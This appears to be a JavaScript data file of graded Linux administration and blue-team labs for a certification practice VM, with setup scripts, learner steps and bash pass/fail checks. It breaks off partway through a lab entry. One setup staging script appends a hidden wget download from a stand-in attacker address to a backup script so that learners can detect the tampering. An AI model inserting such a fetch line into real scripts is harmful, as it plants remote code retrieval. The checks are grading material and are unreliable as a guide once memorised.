/* Graded labs and the VM exam for the practice VM (assets/vm.js).
   Each check is a bash snippet run as root inside the VM by the checker service; exit code 0 means it passed.
   mode: "single" (one VM, host "lab", disks /dev/sda and /dev/sdb) or "network" (VMs "server" 10.10.0.10 and
   "client" 10.10.0.20 on one network). A check's "vm" names which machine runs it (network labs only).
   setup: commands run as root when the lab's VM starts. keep: true marks a check that is already true at the start and
   makes sure the learner didn't break it. Keep checks strict about the goal, loose about the method. */
CertHub.vmLabs = {
  labs: [
    { id: "users", title: "Create a user account the right way", mode: "single", minutes: 15, level: "Beginner", certs: ["linux-plus", "rhcsa", "a-plus-core2", "server-plus"],
      intro: "A new developer, Alex, starts today. Create the account with a home directory, the bash shell, a password, a 90-day password age and membership in the developers group.",
      steps: [
        "Create the group: `sudo groupadd devs`",
        "Create the user with a home directory and bash: `sudo useradd -m -s /bin/bash -G devs alex`",
        "Set a password: `sudo passwd alex`",
        "Make the password expire every 90 days: `sudo chage -M 90 alex`, then check with `sudo chage -l alex`",
        "Confirm: `id alex` and `getent passwd alex`"
      ],
      checks: [
        { label: "User alex exists", cmd: "id alex" },
        { label: "alex's shell is /bin/bash", cmd: "[ \"$(getent passwd alex | cut -d: -f7)\" = /bin/bash ]" },
        { label: "alex owns a home directory at /home/alex", cmd: "[ -d /home/alex ] && [ \"$(stat -c %U /home/alex)\" = alex ]" },
        { label: "alex is a member of devs", cmd: "id -nG alex | tr ' ' '\\n' | grep -qx devs" },
        { label: "alex has a password set", cmd: "passwd -S alex | awk '{print $2}' | grep -qx P" },
        { label: "alex's password expires after 90 days", cmd: "[ \"$(chage -l alex | awk -F': ' '/Maximum number/{print $2}')\" = 90 ]" }
      ] },
    { id: "shared-dir", title: "Set up a shared team folder with the setgid bit", mode: "single", minutes: 15, level: "Beginner", certs: ["linux-plus", "rhcsa", "server-plus"],
      intro: "The devs team needs /srv/projects: team members can read and write, everyone else is kept out, and new files automatically belong to the devs group.",
      steps: [
        "Create the group if you haven't: `sudo groupadd devs`",
        "Create the folder: `sudo mkdir -p /srv/projects`",
        "Give it to the group: `sudo chown root:devs /srv/projects`",
        "Set rwx for owner and group, nothing for others, plus setgid: `sudo chmod 2770 /srv/projects`",
        "Create /srv/projects/plan.txt and make it readable by the group only: `sudo touch /srv/projects/plan.txt` then `sudo chmod 640 /srv/projects/plan.txt`",
        "Check: `ls -ld /srv/projects` shows `drwxrws---`"
      ],
      checks: [
        { label: "/srv/projects is owned by root:devs", cmd: "[ \"$(stat -c %U:%G /srv/projects)\" = root:devs ]" },
        { label: "Mode is 2770 (setgid, no access for others)", cmd: "[ \"$(stat -c %a /srv/projects)\" = 2770 ]" },
        { label: "New files inherit the devs group", cmd: "f=$(mktemp -p /srv/projects) && g=$(stat -c %G \"$f\") && rm -f \"$f\" && [ \"$g\" = devs ]" },
        { label: "plan.txt is mode 640 in group devs", cmd: "[ \"$(stat -c %a:%G /srv/projects/plan.txt)\" = 640:devs ]" }
      ] },
    { id: "acl", title: "Grant one user access with an ACL", mode: "single", minutes: 10, level: "Intermediate", certs: ["linux-plus", "rhcsa", "security-plus"],
      intro: "An auditor, Bob, needs to read /srv/report.txt. The file must stay owned by root with mode 600 for everyone else, so use an access control list instead of changing the owner or group.",
      steps: [
        "Create the user: `sudo useradd -m bob`",
        "Create the file: `echo 'Q3 numbers' | sudo tee /srv/report.txt` and `sudo chmod 600 /srv/report.txt`",
        "Add the ACL entry: `sudo setfacl -m u:bob:r /srv/report.txt`",
        "Check it: `getfacl /srv/report.txt` and `sudo -u bob cat /srv/report.txt`"
      ],
      checks: [
        { label: "report.txt is still owned by root:root", cmd: "[ \"$(stat -c %U:%G /srv/report.txt)\" = root:root ]" },
        { label: "An ACL gives bob read access", cmd: "getfacl -p /srv/report.txt 2>/dev/null | grep -q '^user:bob:r'" },
        { label: "bob can read the file", cmd: "su -s /bin/sh bob -c 'cat /srv/report.txt' >/dev/null" },
        { keep: true, label: "Other users still can't read it", cmd: "! su -s /bin/sh nobody -c 'cat /srv/report.txt' >/dev/null 2>&1" }
      ] },
    { id: "sudo", title: "Delegate one admin command with sudo", mode: "single", minutes: 15, level: "Intermediate", certs: ["linux-plus", "rhcsa", "security-plus", "server-plus"],
      intro: "The operations team may restart the SSH service, and nothing else, without a password. Grant exactly that, following least privilege.",
      steps: [
        "Create the group and a member: `sudo groupadd ops` and `sudo useradd -m -G ops olivia`",
        "Create a drop-in with visudo: `sudo visudo -f /etc/sudoers.d/ops`",
        "Add this line: `%ops ALL=(root) NOPASSWD: /usr/bin/systemctl restart ssh`",
        "Check the syntax: `sudo visudo -cf /etc/sudoers.d/ops`",
        "See what olivia may run: `sudo -l -U olivia`"
      ],
      checks: [
        { label: "olivia is in the ops group", cmd: "id -nG olivia | tr ' ' '\\n' | grep -qx ops" },
        { label: "/etc/sudoers.d/ops has valid syntax", cmd: "visudo -cf /etc/sudoers.d/ops" },
        { label: "ops members may restart ssh without a password", cmd: "sudo -l -U olivia | grep -q 'NOPASSWD: /usr/bin/systemctl restart ssh'" },
        { keep: true, label: "olivia can't run everything as root", cmd: "! sudo -l -U olivia | grep -Eq '\\(ALL( : ALL)?\\) (NOPASSWD: )?ALL$'" }
      ] },
    { id: "service", title: "Write and enable a systemd service", mode: "single", minutes: 20, level: "Intermediate", certs: ["linux-plus", "rhcsa", "server-plus"],
      intro: "Run a small heartbeat script as a service that starts at boot, restarts if it fails and logs to the journal.",
      steps: [
        "Create the script: `sudo vi /usr/local/bin/heartbeat.sh` with a loop such as `while true; do echo \"heartbeat $(date)\"; sleep 30; done` (start the file with `#!/bin/bash`)",
        "Make it executable: `sudo chmod +x /usr/local/bin/heartbeat.sh`",
        "Create the unit: `sudo vi /etc/systemd/system/heartbeat.service` with a [Unit] Description, a [Service] section with `ExecStart=/usr/local/bin/heartbeat.sh` and `Restart=on-failure`, and an [Install] section with `WantedBy=multi-user.target`",
        "Load it, enable it and start it: `sudo systemctl daemon-reload` then `sudo systemctl enable --now heartbeat`",
        "Check: `systemctl status heartbeat` and `journalctl -u heartbeat`"
      ],
      checks: [
        { label: "/usr/local/bin/heartbeat.sh is executable", cmd: "[ -x /usr/local/bin/heartbeat.sh ]" },
        { label: "heartbeat.service is enabled", cmd: "systemctl is-enabled heartbeat.service" },
        { label: "heartbeat.service is running", cmd: "systemctl is-active heartbeat.service" },
        { label: "It restarts on failure", cmd: "systemctl show -p Restart heartbeat.service | grep -qx 'Restart=on-failure'" },
        { label: "Its output is in the journal", cmd: "journalctl -u heartbeat.service --no-pager | grep -q heartbeat" }
      ] },
    { id: "timer", title: "Schedule a backup with a systemd timer", mode: "single", minutes: 20, level: "Intermediate", certs: ["linux-plus", "rhcsa"],
      intro: "Back up /etc to /var/backups/etc.tar.gz every 15 minutes with a service and a timer instead of cron.",
      steps: [
        "Create `/etc/systemd/system/backup.service` with `Type=oneshot` and `ExecStart=/usr/bin/tar -czf /var/backups/etc.tar.gz /etc`",
        "Create `/etc/systemd/system/backup.timer` with a [Timer] section `OnCalendar=*:0/15` and an [Install] section `WantedBy=timers.target`",
        "Reload and start the timer: `sudo systemctl daemon-reload` then `sudo systemctl enable --now backup.timer`",
        "Run the backup once now: `sudo systemctl start backup.service`",
        "Check: `systemctl list-timers` and `ls -l /var/backups`"
      ],
      checks: [
        { label: "backup.timer is enabled", cmd: "systemctl is-enabled backup.timer" },
        { label: "backup.timer is active", cmd: "systemctl is-active backup.timer" },
        { label: "It runs every 15 minutes", cmd: "systemctl show -p TimersCalendar backup.timer | grep -Eq '0/15|00/15'" },
        { label: "The backup file exists", cmd: "[ -s /var/backups/etc.tar.gz ] && tar -tzf /var/backups/etc.tar.gz | grep -q 'etc/hostname'" }
      ] },
    { id: "cron", title: "Schedule a cleanup job with cron", mode: "single", minutes: 10, level: "Beginner", certs: ["linux-plus", "a-plus-core2", "server-plus"],
      intro: "Every night at 02:30, delete files ending in .tmp older than 7 days from /home/student/tmp.",
      steps: [
        "Write the script: `vi ~/cleanup.sh` with `#!/bin/bash` and `find /home/student/tmp -name '*.tmp' -mtime +7 -delete`",
        "Make it executable: `chmod +x ~/cleanup.sh`",
        "Edit your crontab: `crontab -e` and add `30 2 * * * /home/student/cleanup.sh`",
        "Check: `crontab -l`"
      ],
      checks: [
        { label: "/home/student/cleanup.sh is executable", cmd: "[ -x /home/student/cleanup.sh ]" },
        { label: "The script uses find to delete old .tmp files", cmd: "grep -q find /home/student/cleanup.sh && grep -q '\\.tmp' /home/student/cleanup.sh" },
        { label: "student's crontab runs it at 02:30 every day", cmd: "crontab -u student -l 2>/dev/null | grep -Eq '^30[[:space:]]+2[[:space:]]+\\*[[:space:]]+\\*[[:space:]]+\\*[[:space:]]+/home/student/cleanup\\.sh'" }
      ] },
    { id: "lvm", title: "Build and grow storage with LVM", mode: "single", minutes: 25, level: "Intermediate", certs: ["linux-plus", "rhcsa", "server-plus"],
      intro: "Pool the two empty disks with LVM, create a 60 MB volume for a website, mount it permanently, then grow it to 100 MB without unmounting.",
      steps: [
        "See the disks: `lsblk`",
        "Make both disks physical volumes: `sudo pvcreate /dev/sda /dev/sdb`",
        "Create a volume group: `sudo vgcreate vgdata /dev/sda /dev/sdb`",
        "Create the logical volume: `sudo lvcreate -n lvweb -L 60M vgdata`",
        "Format and mount it: `sudo mkfs.ext4 /dev/vgdata/lvweb`, `sudo mkdir -p /srv/web`, `sudo mount /dev/vgdata/lvweb /srv/web`",
        "Make it permanent: add `/dev/vgdata/lvweb /srv/web ext4 defaults 0 2` to /etc/fstab, then test with `sudo umount /srv/web && sudo mount -a`",
        "Grow the volume and filesystem together: `sudo lvextend -r -L 100M /dev/vgdata/lvweb`, then check with `df -h /srv/web`"
      ],
      checks: [
        { label: "Volume group vgdata uses both disks", cmd: "[ \"$(pvs --noheadings -o vg_name /dev/sda /dev/sdb 2>/dev/null | grep -c vgdata)\" = 2 ]" },
        { label: "Logical volume lvweb is at least 100 MB", cmd: "[ \"$(lvs --noheadings --units m -o lv_size vgdata/lvweb | tr -d ' m' | cut -d. -f1)\" -ge 96 ]" },
        { label: "It's mounted at /srv/web as ext4", cmd: "findmnt -n -o FSTYPE /srv/web | grep -qx ext4" },
        { label: "The filesystem was grown too", cmd: "[ \"$(df -m --output=size /srv/web | tail -1 | tr -d ' ')\" -ge 85 ]" },
        { label: "/etc/fstab mounts it at boot", cmd: "grep -Eq '^[^#]*(vgdata/lvweb|vgdata-lvweb|UUID=[0-9a-f-]+)[[:space:]]+/srv/web[[:space:]]+ext4' /etc/fstab && findmnt --verify --tab-file /etc/fstab >/dev/null 2>&1" }
      ] },
    { id: "partitions", title: "Partition a disk, add a filesystem and swap", mode: "single", minutes: 20, level: "Intermediate", certs: ["linux-plus", "rhcsa", "a-plus-core2", "server-plus"],
      intro: "Give /dev/sdb a GPT partition table with a 40 MB ext4 data partition mounted at /data by UUID, and use the rest as swap.",
      steps: [
        "Create the partition table and partitions: `sudo parted /dev/sdb mklabel gpt`, `sudo parted /dev/sdb mkpart data ext4 1MiB 41MiB`, `sudo parted /dev/sdb mkpart swap linux-swap 41MiB 100%`",
        "Format: `sudo mkfs.ext4 /dev/sdb1` and `sudo mkswap /dev/sdb2`",
        "Mount: `sudo mkdir -p /data` and `sudo mount /dev/sdb1 /data`",
        "Turn on swap: `sudo swapon /dev/sdb2`, then check `swapon --show` and `free -m`",
        "Find the UUIDs with `sudo blkid`, and add both to /etc/fstab: `UUID=<data uuid> /data ext4 defaults 0 2` and `UUID=<swap uuid> none swap sw 0 0`"
      ],
      checks: [
        { label: "/dev/sdb has a GPT partition table", cmd: "[ \"$(blkid -o value -s PTTYPE /dev/sdb)\" = gpt ]" },
        { label: "/dev/sdb1 is ext4 and mounted at /data", cmd: "[ \"$(blkid -o value -s TYPE /dev/sdb1)\" = ext4 ] && findmnt -n -o SOURCE /data | grep -q sdb1" },
        { label: "/data is in /etc/fstab by UUID", cmd: "u=$(blkid -o value -s UUID /dev/sdb1) && grep -Eq \"^UUID=$u[[:space:]]+/data[[:space:]]\" /etc/fstab" },
        { label: "/dev/sdb2 is active swap", cmd: "swapon --show=NAME --noheadings | grep -q sdb2" },
        { label: "The swap is in /etc/fstab", cmd: "u=$(blkid -o value -s UUID /dev/sdb2) && grep -Eq \"^(UUID=$u|/dev/sdb2)[[:space:]]+(none|swap)[[:space:]]+swap\" /etc/fstab" }
      ] },
    { id: "journal", title: "Keep logs across reboots and cap their size", mode: "single", minutes: 10, level: "Beginner", certs: ["linux-plus", "rhcsa", "cysa-plus"],
      intro: "By default this system keeps the journal in memory only. Make it persistent, cap it at 50 MB, and practice finding events.",
      steps: [
        "Create the folder that makes the journal persistent: `sudo mkdir -p /var/log/journal`",
        "Cap the size with a drop-in: `sudo mkdir -p /etc/systemd/journald.conf.d` and create `/etc/systemd/journald.conf.d/size.conf` containing `[Journal]` and `SystemMaxUse=50M`",
        "Apply it: `sudo systemctl restart systemd-journald` (or `sudo journalctl --flush`)",
        "Practice: `journalctl -b -p warning`, `journalctl -u ssh --since '10 min ago'`, `journalctl -f`"
      ],
      checks: [
        { label: "The journal is stored on disk in /var/log/journal", cmd: "ls /var/log/journal/*/system.journal >/dev/null 2>&1" },
        { label: "SystemMaxUse is set to 50M", cmd: "systemd-analyze cat-config systemd/journald.conf 2>/dev/null | grep -Eq '^SystemMaxUse=50M'" }
      ] },
    { id: "processes", title: "Find, reprioritize and stop processes", mode: "single", minutes: 10, level: "Beginner", certs: ["linux-plus", "rhcsa", "a-plus-core2"],
      setup: "id bob >/dev/null 2>&1 || useradd -m bob; su -s /bin/bash bob -c 'nohup bash -c \"exec -a datasync sleep 100000\" >/dev/null 2>&1 &'; su -s /bin/bash bob -c 'nohup bash -c \"exec -a cleanup-old sleep 100000\" >/dev/null 2>&1 &'",
      intro: "Two of bob's jobs need attention: datasync should run at a lower priority (nice 15), and cleanup-old is stuck and must be stopped.",
      steps: [
        "Find them: `ps aux | grep -E 'datasync|cleanup-old'` or `pgrep -a -u bob`",
        "Lower datasync's priority: `sudo renice -n 15 -p <PID>`",
        "Check the nice value: `ps -o pid,ni,cmd -p <PID>`",
        "Stop cleanup-old politely first: `sudo kill <PID>` (SIGTERM), and only use `kill -9` if it doesn't stop"
      ],
      checks: [
        { keep: true, label: "datasync is still running", cmd: "pgrep -f '^datasync' >/dev/null" },
        { label: "datasync runs at nice 15", cmd: "[ \"$(ps -o ni= -p \"$(pgrep -f '^datasync' | head -1)\" | tr -d ' ')\" = 15 ]" },
        { label: "cleanup-old is stopped", cmd: "! pgrep -f '^cleanup-old' >/dev/null" }
      ] },
    { id: "firewall", title: "Lock down a server with iptables", mode: "single", minutes: 20, level: "Intermediate", certs: ["linux-plus", "security-plus", "network-plus", "server-plus"],
      intro: "Build a default-deny firewall: keep loopback and existing connections working, allow SSH and ping, drop everything else, and save the rules.",
      steps: [
        "Allow loopback: `sudo iptables -A INPUT -i lo -j ACCEPT`",
        "Allow replies to connections you started: `sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT`",
        "Allow SSH: `sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT`",
        "Allow ping: `sudo iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT`",
        "Only now set the default: `sudo iptables -P INPUT DROP`",
        "Review with `sudo iptables -L -v -n --line-numbers`, then save: `sudo mkdir -p /etc/iptables` and `sudo iptables-save | sudo tee /etc/iptables/rules.v4`"
      ],
      checks: [
        { label: "The INPUT policy is DROP", cmd: "iptables -S INPUT | grep -qx -- '-P INPUT DROP'" },
        { label: "Loopback traffic is allowed", cmd: "iptables -C INPUT -i lo -j ACCEPT" },
        { label: "Established connections are allowed", cmd: "iptables -S INPUT | grep -Eq -- '--ctstate (RELATED,ESTABLISHED|ESTABLISHED,RELATED|ESTABLISHED) -j ACCEPT|--state (RELATED,ESTABLISHED|ESTABLISHED,RELATED|ESTABLISHED) -j ACCEPT'" },
        { label: "SSH (TCP 22) is allowed", cmd: "iptables -S INPUT | grep -Eq -- '-p tcp .*--dport 22 .*-j ACCEPT'" },
        { label: "The rules are saved to /etc/iptables/rules.v4", cmd: "grep -q '^:INPUT DROP' /etc/iptables/rules.v4 && grep -q -- '--dport 22' /etc/iptables/rules.v4" }
      ] },
    { id: "ssh-keys", title: "Log in with SSH keys and turn off passwords", mode: "network", minutes: 20, level: "Intermediate", certs: ["linux-plus", "rhcsa", "security-plus", "server-plus"],
      intro: "Two machines share a network: client (10.10.0.20) and server (10.10.0.10). Set up key-based login from client to server, then stop the server accepting passwords.",
      steps: [
        "On client: create a key pair with `ssh-keygen -t ed25519` (press Enter to accept the defaults)",
        "On client: copy the public key to the server: `ssh-copy-id student@server` (password: student)",
        "On client: test it: `ssh student@server hostname` should work without a password",
        "On server: disable password logins: `sudo vi /etc/ssh/sshd_config.d/50-keys-only.conf` with `PasswordAuthentication no`",
        "On server: check the config and reload: `sudo sshd -t` then `sudo systemctl reload ssh`",
        "On client: confirm keys still work: `ssh student@server hostname`"
      ],
      checks: [
        { vm: "client", label: "client has an SSH key pair", cmd: "ls /home/student/.ssh/id_* 2>/dev/null | grep -qv '\\.pub$'" },
        { vm: "server", label: "server authorizes a key for student", cmd: "grep -Eq '^(ssh-|ecdsa-)' /home/student/.ssh/authorized_keys" },
        { vm: "client", label: "Key login from client to server works", cmd: "su - student -c 'ssh -o BatchMode=yes -o StrictHostKeyChecking=accept-new -o ConnectTimeout=8 student@server true'" },
        { vm: "server", label: "server refuses password logins", cmd: "sshd -T 2>/dev/null | grep -qx 'passwordauthentication no'" },
        { keep: true, vm: "server", label: "The SSH service is running", cmd: "systemctl is-active ssh" }
      ] },
    { id: "web-service", title: "Serve a website to another machine", mode: "network", minutes: 20, level: "Intermediate", certs: ["linux-plus", "network-plus", "server-plus"],
      intro: "On server, publish a small web page on port 80 with a systemd service, then fetch it from client.",
      steps: [
        "On server: create the page: `sudo mkdir -p /srv/www` and `echo 'Welcome to the StudyToCert server' | sudo tee /srv/www/index.html`",
        "On server: create `/etc/systemd/system/web.service` with `ExecStart=/usr/bin/busybox httpd -f -p 80 -h /srv/www` in [Service] and `WantedBy=multi-user.target` in [Install]",
        "On server: `sudo systemctl daemon-reload` and `sudo systemctl enable --now web`",
        "On server: confirm it's listening: `ss -ltnp | grep :80`",
        "On client: fetch it: `wget -qO- http://server/`"
      ],
      checks: [
        { vm: "server", label: "web.service is enabled and running", cmd: "systemctl is-enabled web.service && systemctl is-active web.service" },
        { vm: "server", label: "Something listens on TCP port 80", cmd: "ss -ltn | grep -Eq '[:.]80[[:space:]]'" },
        { vm: "client", label: "client gets the page from server", cmd: "wget -qO- -T 5 http://server/ | grep -qi welcome" }
      ] },
    { id: "firewall-pair", title: "Allow SSH only from a trusted host", mode: "network", minutes: 20, level: "Advanced", certs: ["security-plus", "network-plus", "linux-plus", "cysa-plus"],
      intro: "On server, allow SSH only from client (10.10.0.20), keep ping working, and drop all other inbound traffic. Test from client.",
      steps: [
        "On server: `sudo iptables -A INPUT -i lo -j ACCEPT` and `sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT`",
        "On server: `sudo iptables -A INPUT -p tcp -s 10.10.0.20 --dport 22 -j ACCEPT`",
        "On server: `sudo iptables -A INPUT -p icmp -j ACCEPT`",
        "On server: `sudo iptables -P INPUT DROP`, then review with `sudo iptables -S`",
        "On client: `ping -c 2 server` and `nc -zv server 22` should both succeed"
      ],
      checks: [
        { vm: "server", label: "server's INPUT policy is DROP", cmd: "iptables -S INPUT | grep -qx -- '-P INPUT DROP'" },
        { vm: "server", label: "SSH is allowed from 10.10.0.20", cmd: "iptables -S INPUT | grep -Eq -- '-s 10\\.10\\.0\\.20(/32)? .*--dport 22 .*-j ACCEPT'" },
        { keep: true, vm: "server", label: "No rule allows SSH from everyone", cmd: "! iptables -S INPUT | grep -- '--dport 22' | grep -v -- '-s 10\\.10\\.0\\.20' | grep -q ACCEPT" },
        { keep: true, vm: "client", label: "client can still reach SSH on server", cmd: "nc -z -w 5 server 22" },
        { keep: true, vm: "client", label: "client can still ping server", cmd: "ping -c 1 -W 3 server >/dev/null" }
      ] },
    // Blue-team labs (group: "blue"): defensive investigation and hardening. Each scenario is staged by its setup.
    { id: "ssh-investigation", group: "blue", title: "Investigate a brute-force attack in the SSH log", mode: "single", minutes: 20, level: "Intermediate", certs: ["security-plus", "cysa-plus", "sscp", "linux-plus"],
      setup: "id deploy >/dev/null 2>&1 || { useradd -m -s /bin/bash deploy; echo 'deploy:Summer2024' | chpasswd; }; mkdir -p /root/incident; f=/var/log/auth-review.log; : > $f; for i in $(seq 10 39); do u=root; [ $((i%3)) = 0 ] && u=deploy; [ $((i%3)) = 1 ] && u='invalid user admin'; echo \"Mar 14 02:$i:0$((i%10)) lab sshd[40$i]: Failed password for $u from 203.0.113.45 port 5$i$((i%10)) ssh2\" >> $f; done; for i in 1 2 3 4 5 6 7 8; do echo \"Mar 14 03:1$i:22 lab sshd[51$i]: Failed password for invalid user test$i from 198.51.100.77 port 60$i$i ssh2\" >> $f; done; echo 'Mar 14 02:40:11 lab sshd[4077]: Accepted password for deploy from 203.0.113.45 port 51122 ssh2' >> $f; echo 'Mar 14 08:02:13 lab sshd[6120]: Failed password for student from 192.0.2.10 port 50210 ssh2' >> $f; echo 'Mar 14 08:02:21 lab sshd[6120]: Accepted password for student from 192.0.2.10 port 50210 ssh2' >> $f; chmod 640 $f",
      intro: "An alert says this server may have been brute-forced overnight. The SSH log is in /var/log/auth-review.log. Find the address that guessed passwords and got in, and the account it broke into; write both to /root/incident/findings.txt; then contain the attack: block that address and lock the account.",
      steps: [
        "Count failed logins per address: `sudo grep 'Failed password' /var/log/auth-review.log | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -rn`",
        "Look for a success from a guessing address: `sudo grep 'Accepted' /var/log/auth-review.log`",
        "One address failed dozens of times and then logged in. The other with only failures never got in, and 192.0.2.10 is a normal user typing a password wrong once.",
        "Record your findings (address and account): `echo '203.0.113.x deploy' | sudo tee /root/incident/findings.txt`, using the real address",
        "Block the address: `sudo iptables -I INPUT -s <address> -j DROP`, then save: `sudo mkdir -p /etc/iptables` and `sudo iptables-save | sudo tee /etc/iptables/rules.v4`",
        "Lock the compromised account: `sudo usermod -L deploy` (and check with `sudo passwd -S deploy`, which shows L)",
        "In a real incident you would also end the account's sessions, check what it did (`last`, its shell history, cron) and reset its password."
      ],
      checks: [
        { label: "findings.txt names the attacking address", cmd: "grep -qw '203\\.0\\.113\\.45' /root/incident/findings.txt" },
        { label: "findings.txt names the compromised account", cmd: "grep -qw deploy /root/incident/findings.txt" },
        { label: "Traffic from the attacker is dropped", cmd: "iptables -S INPUT | grep -Eq -- '-s 203\\.0\\.113\\.45(/32)? .*-j (DROP|REJECT)'" },
        { label: "The block is saved to /etc/iptables/rules.v4", cmd: "grep -Eq -- '-s 203\\.0\\.113\\.45(/32)? .*-j (DROP|REJECT)' /etc/iptables/rules.v4" },
        { label: "The deploy account is locked", cmd: "passwd -S deploy | awk '{print $2}' | grep -qx L" },
        { keep: true, label: "The innocent address 192.0.2.10 isn't blocked", cmd: "! iptables -S INPUT | grep -q '192\\.0\\.2\\.10'" }
      ] },
    { id: "ssh-hardening", group: "blue", title: "Harden the SSH server", mode: "single", minutes: 15, level: "Intermediate", certs: ["security-plus", "linux-plus", "rhcsa", "sscp", "securityx"],
      intro: "Apply a hardening baseline to SSH: no direct root login, at most 3 password attempts per connection, 30 seconds to log in, and no X11 forwarding. Use a drop-in file so package updates don't overwrite your changes.",
      steps: [
        "See the settings in effect now: `sudo sshd -T | grep -E 'permitrootlogin|maxauthtries|logingracetime|x11forwarding'`",
        "Create a drop-in: `sudo vi /etc/ssh/sshd_config.d/10-hardening.conf` with the lines `PermitRootLogin no`, `MaxAuthTries 3`, `LoginGraceTime 30` and `X11Forwarding no`",
        "Files in sshd_config.d are read before the main file, and for most settings the first value wins, so a drop-in beats the defaults in sshd_config.",
        "Check the syntax before applying: `sudo sshd -t` (no output means it's valid)",
        "Apply it without dropping existing sessions: `sudo systemctl reload ssh`",
        "Confirm: run the `sshd -T` command from step 1 again"
      ],
      checks: [
        { label: "Root can't log in over SSH", cmd: "sshd -T 2>/dev/null | grep -qx 'permitrootlogin no'" },
        { label: "At most 3 authentication attempts", cmd: "sshd -T 2>/dev/null | grep -qx 'maxauthtries 3'" },
        { label: "30 seconds to log in", cmd: "sshd -T 2>/dev/null | grep -qx 'logingracetime 30'" },
        { label: "X11 forwarding is off", cmd: "sshd -T 2>/dev/null | grep -qx 'x11forwarding no'" },
        { label: "The settings are in a drop-in file", cmd: "grep -rqsi '^ *PermitRootLogin *no' /etc/ssh/sshd_config.d/" },
        { keep: true, label: "The configuration is valid and SSH is running", cmd: "sshd -t && systemctl is-active ssh" }
      ] },
    { id: "file-integrity", group: "blue", title: "Find a tampered file with a hash baseline", mode: "single", minutes: 15, level: "Intermediate", certs: ["security-plus", "cysa-plus", "sscp", "linux-plus"],
      setup: "mkdir -p /opt/app/bin /opt/app/release /var/lib/app /root/incident; printf '#!/bin/bash\\n# Nightly backup of the app data\\ntar -czf /var/backups/app.tar.gz /opt/app/data\\n' > /opt/app/bin/backup.sh; printf '#!/bin/bash\\n# Rotate app logs\\nfind /var/log/app -name \"*.log\" -mtime +14 -delete\\n' > /opt/app/bin/rotate.sh; printf '#!/bin/bash\\n# Health check\\nsystemctl is-active ssh\\n' > /opt/app/bin/health.sh; chmod 755 /opt/app/bin/*.sh; cp -p /opt/app/bin/*.sh /opt/app/release/; (cd /opt/app/bin && sha256sum /opt/app/bin/*.sh > /var/lib/app/baseline.sha256); chmod 444 /var/lib/app/baseline.sha256; printf '# added outside change control\\nwget -q -O /tmp/.u http://203.0.113.45/u.sh\\n' >> /opt/app/bin/backup.sh",
      intro: "When the app was installed, its scripts were fingerprinted with SHA-256 into /var/lib/app/baseline.sha256. Check them against the baseline, find the file that changed, record it in /root/incident/changed.txt, and restore the approved copy from /opt/app/release.",
      steps: [
        "Compare every file with the baseline: `sha256sum -c /var/lib/app/baseline.sha256`",
        "One line says FAILED. Look at what changed: `diff /opt/app/release/backup.sh /opt/app/bin/backup.sh` (use the file that failed)",
        "Record it: `echo /opt/app/bin/<file> | sudo tee /root/incident/changed.txt`",
        "Restore the approved version, keeping its permissions: `sudo cp -p /opt/app/release/<file> /opt/app/bin/`",
        "Check again: `sha256sum -c /var/lib/app/baseline.sha256` should say OK for every file",
        "Never fix a mismatch by regenerating the baseline: that would approve the attacker's change. Tools like AIDE and Tripwire automate this same check."
      ],
      checks: [
        { label: "changed.txt names the tampered file", cmd: "grep -q '/opt/app/bin/backup.sh' /root/incident/changed.txt && ! grep -qE 'rotate|health' /root/incident/changed.txt" },
        { label: "Every script matches the baseline again", cmd: "sha256sum -c --quiet /var/lib/app/baseline.sha256" },
        { label: "The injected download line is gone", cmd: "! grep -q '203\\.0\\.113\\.45' /opt/app/bin/backup.sh" },
        { keep: true, label: "The baseline wasn't regenerated", cmd: "grep -q \"$(sha256sum /opt/app/release/backup.sh | cut -d' ' -f1)  /opt/app/bin/backup.sh\" /var/lib/app/baseline.sha256" }
      ] },
    { id: "sudo-audit", group: "blue", title: "Audit sudo rights and accounts", mode: "single", minutes: 20, level: "Intermediate", certs: ["security-plus", "linux-plus", "sscp", "isc2-cc", "cysa-plus"],
      setup: "chmod 440 /etc/sudoers; groupadd -f ops; id olivia >/dev/null 2>&1 || useradd -m -G ops olivia; echo '%ops ALL=(root) NOPASSWD: /usr/bin/systemctl restart ssh' > /etc/sudoers.d/ops; id tempadmin >/dev/null 2>&1 || useradd -m tempadmin; echo 'tempadmin ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/90-temp; id intern >/dev/null 2>&1 || useradd -m -G sudo intern; id contractor >/dev/null 2>&1 || useradd -m contractor; echo 'contractor:Contract0r-2023' | chpasswd; chmod 440 /etc/sudoers.d/ops /etc/sudoers.d/90-temp",
      intro: "A quarterly access review found problems: tempadmin still has full root rights without a password from an old project, intern was added to the sudo group by mistake, and contractor's contract has ended. Fix all three without touching the legitimate ops rule for olivia.",
      steps: [
        "List who can use sudo: `getent group sudo` and `sudo ls -l /etc/sudoers.d/` then `sudo cat /etc/sudoers.d/*`",
        "Check one user's rights: `sudo -l -U tempadmin`",
        "Remove tempadmin's blanket rule: `sudo rm /etc/sudoers.d/90-temp` (or edit it with `sudo visudo -f /etc/sudoers.d/90-temp`)",
        "Take intern out of the sudo group: `sudo gpasswd -d intern sudo`",
        "Disable contractor without deleting the files: `sudo usermod -L -e 1 contractor` (locks the password and expires the account)",
        "Check the sudo configuration is still valid: `sudo visudo -c`",
        "Confirm olivia still has exactly her one command: `sudo -l -U olivia`"
      ],
      checks: [
        { label: "tempadmin has no sudo rights", cmd: "sudo -l -U tempadmin 2>&1 | grep -q 'not allowed'" },
        { label: "intern isn't in the sudo group", cmd: "! id -nG intern | tr ' ' '\\n' | grep -qx sudo" },
        { label: "contractor's password is locked", cmd: "passwd -S contractor | awk '{print $2}' | grep -qx L" },
        { label: "contractor's account has expired", cmd: "e=$(getent shadow contractor | cut -d: -f8); [ -n \"$e\" ] && [ \"$e\" -le $(( $(date +%s) / 86400 )) ]" },
        { keep: true, label: "The sudo configuration is valid", cmd: "visudo -c -q" },
        { keep: true, label: "olivia can still restart SSH", cmd: "sudo -l -U olivia | grep -q '/usr/bin/systemctl restart ssh'" }
      ] },
    { id: "permissions-audit", group: "blue", title: "Find risky SUID and world-writable files", mode: "single", minutes: 15, level: "Intermediate", certs: ["security-plus", "linux-plus", "cysa-plus", "sscp"],
